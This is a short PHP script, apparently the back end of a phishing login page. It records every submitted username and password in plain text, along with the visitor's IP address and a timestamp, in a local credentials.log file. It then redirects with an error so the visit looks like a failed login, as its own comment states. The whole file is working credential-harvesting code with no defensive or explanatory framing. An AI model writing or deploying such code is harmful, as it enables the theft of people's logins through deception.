<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: /');
    exit;
}

$ip       = $_SERVER['REMOTE_ADDR'] ?? '-';
$username = strip_tags($_POST['username'] ?? '');
$password = strip_tags($_POST['password'] ?? '');

if ($username !== '' || $password !== '') {
    $line = date('Y-m-d H:i:s') . "\t" . $ip . "\t" . $username . "\t" . $password . PHP_EOL;
    @file_put_contents(__DIR__ . '/credentials.log', $line, FILE_APPEND | LOCK_EX);
}

// Redirect back with error to look like a failed login attempt
header('Location: /?error=1');
exit;
